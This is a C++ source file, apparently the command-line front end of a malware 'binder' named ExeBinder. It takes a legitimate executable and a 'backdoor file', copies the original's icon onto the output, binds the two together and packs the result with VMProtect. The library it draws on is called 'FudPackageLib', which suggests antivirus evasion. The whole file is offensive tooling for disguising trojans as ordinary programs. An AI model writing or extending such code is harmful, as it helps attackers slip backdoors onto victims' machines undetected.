// ExeBinder.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "..\FudPackageLib\Base.h"

void vmp(LPCTSTR lpszFileName)
{
	TCHAR szCmd[MAX_PATH] = { 0 };
	_stprintf_s(szCmd,_T("VMProtect_Con.exe %s"), lpszFileName);
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	RtlZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	GetStartupInfo(&si);
	RtlZeroMemory(&pi, sizeof(pi));
	si.wShowWindow = SW_SHOW;
	// Start the child process.   
	if (CreateProcess(NULL,   // No module name (use command line)  
		(LPSTR)szCmd,        // Command line  
		NULL,           // Process handle not inheritable  
		NULL,           // Thread handle not inheritable  
		FALSE,          // Set handle inheritance to FALSE  
		0,              // No creation flags  
		NULL,           // Use parent's environment block  
		NULL,           // Use parent's starting directory   
		&si,            // Pointer to STARTUPINFO structure  
		&pi)
		)
	{

		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
}

int main(int argc,char *argv[])
{
	//srcfile backdoorfile destfile
	TCHAR szFileName[MAX_PATH] = { 0 };
	TCHAR szDatFile[MAX_PATH] = { 0 };
	::GetModuleFileName(NULL, szFileName, MAX_PATH);
	*(_tcsrchr(szFileName, _T('\\')) + 1) = NULL;
	_tcsncpy(szDatFile, szFileName, MAX_PATH);
	_tcsncat(szDatFile, _T("fudpak.dat"), MAX_PATH);

	if (argc==4)
	{
		IconExchange(argv[1], szDatFile, argv[3]);
		bind_file(argv[1], argv[2], argv[3]);
		vmp(argv[3]);
	}
	else
	{
		printf("%s <src file> <backdoor file> <dest file>\r\n", argv[0]);
	}
    return 0;
}

